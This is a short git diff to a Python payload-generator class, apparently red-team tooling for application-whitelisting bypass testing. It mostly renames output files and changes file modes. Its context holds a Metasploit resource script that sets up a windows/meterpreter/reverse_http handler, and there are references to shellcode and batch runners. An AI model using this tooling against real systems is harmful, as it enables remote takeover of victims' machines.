@@ -107,7 +107,7 @@ class Generator():
 		return shellcode
 
 	def genRunScript(self, run_info):
-		with open('./GenerateAll/run.bat', 'a') as f:
+		with open('./GenerateAll/gr8sct.bat', 'a+') as f:
 			f.write(run_info + '\n')
 			f.write('timeout 30 > NUL\n')
 
@@ -143,8 +143,11 @@ set LPORT {1}
 set payload windows/meterpreter/reverse_http
 run -j'''.format(host, port)
 
-		with open('./GenerateAll/gr8sct.rc', 'w') as f:
+		with open('./GenerateAll/gr8sct.rc', 'w+') as f:
 			f.write(msfrc)
+	def createAnalystCSVFile(self):
+		with open("./GenerateAll/analyst.csv", 'w+') as f:
+			f.write('bypass,uuid,sucessful\n')
 
 	def genAnalystCSVFile(self, bypass, uuid):
 		with open("./GenerateAll/analyst.csv", 'a') as f:
